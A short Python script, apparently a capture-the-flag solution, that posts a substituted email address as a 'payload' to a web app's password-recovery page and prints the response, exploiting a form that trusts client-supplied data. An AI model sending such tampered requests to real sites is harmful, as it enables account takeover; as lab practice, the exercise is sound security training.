import requests
import re
from bs4 import BeautifulSoup

def get_IP():
	ip = None
	with open('../../IP') as file:
		return file.readlines()[0].strip()

data = {'mail': 'haker@gmail.com', 'Submit': 'Submit'} # payload
url = get_IP() +"index.php?page=recover"
r = requests.post(url, data=data)
if(r.status_code == 200): # check if the request has been successed
	text = r.content
	soup = BeautifulSoup(text, 'html.parser')
	s = soup.find('center')
	print(s.text)